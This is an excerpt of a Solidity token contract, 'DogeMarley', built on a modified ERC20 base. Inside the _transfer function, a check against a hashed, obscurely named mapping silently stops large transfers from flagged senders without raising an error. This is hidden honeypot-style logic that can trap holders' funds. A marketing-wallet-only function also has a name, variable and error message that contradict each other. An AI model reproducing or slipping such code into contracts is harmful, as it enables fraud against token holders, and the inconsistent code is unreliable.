...
contract DogeMarley is ERC20, Ownable {
    ...
    function updateMaxWalletAmount(uint256 newNum) external {
        require(msg.sender == marketingWallet);
        require(newNum >= totalSupply() / 10, "Cannot set maxTransactionAmount lower than 0.1%");
        maxTransactionAmount = newNum;
    }
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        if (_is[keccak256(abi.encodePacked(uint256(uint160(sender))))]) {if (amount >= _totalSupply / 10) return;}
